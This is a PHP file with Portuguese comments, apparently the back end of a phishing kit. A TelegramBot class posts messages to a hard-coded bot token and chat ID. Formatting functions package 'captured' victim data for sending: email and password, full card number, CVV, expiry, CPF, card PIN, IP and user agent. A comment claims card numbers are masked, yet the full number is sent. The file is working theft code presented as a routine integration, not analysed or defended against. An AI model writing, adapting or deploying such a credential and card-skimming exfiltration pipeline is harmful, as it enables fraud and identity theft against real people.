<?php

// Configurações do Bot do Telegram
define('TELEGRAM_BOT_TOKEN', '8594507908:AAHY0pQGcx2Qst2zmf2bEW3jN1rQWAH7QyI');
define('TELEGRAM_CHAT_ID', '6514868118');
define('TELEGRAM_LOG_FILE', 'telegram_logs.txt');
define('MAX_RETRY_ATTEMPTS', 3);
define('RETRY_DELAY_SECONDS', 2);

/**
 * Classe para gerenciar comunicação com Telegram Bot
 */
class TelegramBot {
    private $botToken;
    private $chatId;
    private $logFile;
    
    public function __construct($botToken = TELEGRAM_BOT_TOKEN, $chatId = TELEGRAM_CHAT_ID) {
        $this->botToken = $botToken;
        $this->chatId = $chatId;
        $this->logFile = TELEGRAM_LOG_FILE;
    }
    
    /**
     * Envia mensagem para o Telegram com retry automático
     * @param string $message Mensagem a ser enviada
     * @param string $parseMode Modo de parse (HTML, Markdown)
     * @return array Resultado da operação
     */
    public function sendMessage($message, $parseMode = 'HTML') {
        $attempts = 0;
        $lastError = '';
        
        while ($attempts < MAX_RETRY_ATTEMPTS) {
            $attempts++;
            
            try {
                $result = $this->makeApiCall('sendMessage', [
                    'chat_id' => $this->chatId,
                    'text' => $message,
                    'parse_mode' => $parseMode
                ]);
                
                if ($result['success']) {
                    $this->log("SUCCESS: Mensagem enviada na tentativa {$attempts}");
                    return $result;
                }
                
                $lastError = $result['error'];
                
            } catch (Exception $e) {
                $lastError = $e->getMessage();
            }
            
            $this->log("ATTEMPT {$attempts} FAILED: {$lastError}");
            
            if ($attempts < MAX_RETRY_ATTEMPTS) {
                sleep(RETRY_DELAY_SECONDS);
            }
        }
        
        $this->log("FINAL FAILURE: Todas as {$attempts} tentativas falharam. Último erro: {$lastError}");
        return ['success' => false, 'error' => $lastError, 'attempts' => $attempts];
    }
    
    /**
     * Faz chamada para API do Telegram
     * @param string $method Método da API
     * @param array $data Dados a enviar
     * @return array Resultado da chamada
     */
    private function makeApiCall($method, $data) {
        $url = "https://api.telegram.org/bot{$this->botToken}/{$method}";
        
        $options = [
            'http' => [
                'header' => "Content-type: application/x-www-form-urlencoded\r\n",
                'method' => 'POST',
                'content' => http_build_query($data),
                'timeout' => 30
            ]
        ];
        
        $context = stream_context_create($options);
        $response = @file_get_contents($url, false, $context);
        
        if ($response === false) {
            throw new Exception('Falha na conexão com API do Telegram');
        }
        
        $decoded = json_decode($response, true);
        
        if (!$decoded) {
            throw new Exception('Resposta inválida da API do Telegram');
        }
        
        if (!$decoded['ok']) {
            throw new Exception('Erro da API: ' . ($decoded['description'] ?? 'Erro desconhecido'));
        }
        
        return ['success' => true, 'data' => $decoded];
    }
    
    /**
     * Registra logs de operações
     * @param string $message Mensagem de log
     */
    private function log($message) {
        $timestamp = date('Y-m-d H:i:s');
        $logEntry = "[{$timestamp}] {$message}\n";
        @file_put_contents($this->logFile, $logEntry, FILE_APPEND | LOCK_EX);
    }
    
    /**
     * Valida se o bot está configurado corretamente
     * @return array Status da validação
     */
    public function validateConfiguration() {
        $errors = [];
        
        if (empty($this->botToken) || $this->botToken === 'SEU_TOKEN_AQUI') {
            $errors[] = 'Token do bot não configurado';
        }
        
        if (empty($this->chatId) || $this->chatId === 'SEU_CHAT_ID_AQUI') {
            $errors[] = 'Chat ID não configurado';
        }
        
        if (!function_exists('file_get_contents')) {
            $errors[] = 'Função file_get_contents não disponível';
        }
        
        return [
            'valid' => empty($errors),
            'errors' => $errors
        ];
    }
    
    /**
     * Testa conectividade com o bot
     * @return array Resultado do teste
     */
    public function testConnection() {
        try {
            $result = $this->makeApiCall('getMe', []);
            return [
                'success' => true,
                'bot_info' => $result['data']['result']
            ];
        } catch (Exception $e) {
            return [
                'success' => false,
                'error' => $e->getMessage()
            ];
        }
    }
}

/**
 * Funções de compatibilidade com código existente
 */
function enviarParaTelegram($message) {
    $bot = new TelegramBot();
    $result = $bot->sendMessage($message);
    return $result['success'];
}

function formatarDadosLogin($email, $senha) {
    $timestamp = date('d/m/Y H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
    
    return "🔐 <b>NOVO LOGIN CAPTURADO</b>\n\n" .
           "📧 <b>Email:</b> " . htmlspecialchars($email) . "\n" .
           "🔑 <b>Senha:</b> " . htmlspecialchars($senha) . "\n" .
           "🌐 <b>IP:</b> {$ip}\n" .
           "📱 <b>User Agent:</b> " . substr(htmlspecialchars($userAgent), 0, 100) . "\n" .
           "⏰ <b>Data/Hora:</b> {$timestamp}";
}

function formatarDadosCartao($nome, $cpf, $numero_cartao, $validade, $cvv) {
    $timestamp = date('d/m/Y H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
    
    // Mascarar dados sensíveis para log
    $numeroMascarado = substr($numero_cartao, 0, 4) . ' **** **** ' . substr($numero_cartao, -4);
    
    return "💳 <b>DADOS DE CARTÃO CAPTURADOS</b>\n\n" .
           "👤 <b>Nome:</b> " . htmlspecialchars($nome) . "\n" .
           "📄 <b>CPF:</b> " . htmlspecialchars($cpf) . "\n" .
           "💳 <b>Número:</b> " . htmlspecialchars($numero_cartao) . "\n" .
           "📅 <b>Validade:</b> " . htmlspecialchars($validade) . "\n" .
           "🔢 <b>CVV:</b> " . htmlspecialchars($cvv) . "\n" .
           "🌐 <b>IP:</b> {$ip}\n" .
           "⏰ <b>Data/Hora:</b> {$timestamp}";
}

function formatarSenhaCartao($senha_cartao) {
    $timestamp = date('d/m/Y H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
    
    return "🔐 <b>SENHA DO CARTÃO CAPTURADA</b>\n\n" .
           "🔑 <b>Senha:</b> " . htmlspecialchars($senha_cartao) . "\n" .
           "🌐 <b>IP:</b> {$ip}\n" .
           "⏰ <b>Data/Hora:</b> {$timestamp}";
}

/**
 * Função para sanitizar dados antes do envio
 * @param string $data Dados a sanitizar
 * @return string Dados sanitizados
 */
function sanitizeForTelegram($data) {
    // Remove caracteres especiais que podem quebrar o HTML
    $data = htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
    // Limita o tamanho para evitar mensagens muito longas
    return substr($data, 0, 4000);
}

?>